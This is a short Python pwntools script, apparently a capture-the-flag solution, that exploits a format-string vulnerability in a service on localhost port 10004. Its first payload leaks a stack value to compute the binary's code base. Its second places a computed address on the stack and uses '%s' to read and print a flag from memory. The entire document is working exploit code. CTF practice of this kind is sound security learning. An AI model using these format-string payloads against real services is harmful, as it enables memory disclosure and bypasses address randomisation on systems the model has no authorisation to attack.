from pwn import *

host = 'localhost'
ip = 10004

s = remote(host, ip)
context.arch = 'amd64'
context.log_level = 'debug'

s.recvuntil(':\n')

# find offset
# offset = 6

# leak code base
payload = '%x.' * 11 + '%llx'
s.sendline(payload)
codebase = int(s.recvline().decode().split('.')[-1], 16) - 0xb20
log.info(f'code base: {hex(codebase)}')

# jump & print
s.recvuntil(':\n')
flag = 0x202060
payload = b'%x' * 8 + b'.%s.....' + p64(flag + codebase)
s.sendline(payload)
print (s.recvline()[:-1].decode().split('.')[1])
s.close()